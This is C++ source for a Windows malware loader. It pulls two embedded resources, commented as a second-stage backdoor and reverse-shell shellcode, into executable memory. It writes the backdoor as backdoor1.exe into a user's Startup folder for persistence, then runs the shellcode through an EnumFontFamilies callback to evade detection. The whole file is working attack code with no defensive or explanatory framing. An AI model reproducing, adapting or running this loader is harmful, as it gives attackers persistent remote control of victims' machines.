#include<Windows.h>
#include <iostream>
#include"resource.h"
#include"resource1.h"

#include <fstream>

using namespace std;

#define IDR_RCDATA1                     101
#define IDR_RCDATA2                     102

int main()
{

    //load the our second stage
    HRSRC find = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    HGLOBAL load = LoadResource(NULL, find);
    PVOID payload = LockResource(load);
    SIZE_T sizerc = SizeofResource(NULL, find);


   //load the shellcode resource to reverse shell
    HRSRC find2 = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA2), RT_RCDATA);
    HGLOBAL load2 = LoadResource(NULL, find2);
    PVOID payload2 = LockResource(load2);
    SIZE_T sizerc2 = SizeofResource(NULL, find2);


    //allocate memory for them
    PVOID revshell = VirtualAlloc(0, sizerc2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(revshell, payload2, sizerc2);
 
    PVOID exe= VirtualAlloc(0, sizerc, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(exe, payload, sizerc);

    
   //write backdoor to startup folder
    std::ofstream file("C:\\Users\\pdy\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor1.exe", std::ios::binary | std::ios::app);
    char* buffer = new char[sizerc];
    memcpy(buffer, exe, sizerc);
    file.write(buffer, sizerc);
    file.close();
    delete[] buffer;
    


    //execute revshell useing callbacks.
    HDC hd = GetDC(NULL);
    EnumFontFamilies(hd, NULL, (FONTENUMPROC)revshell, NULL);

    return 0;

}
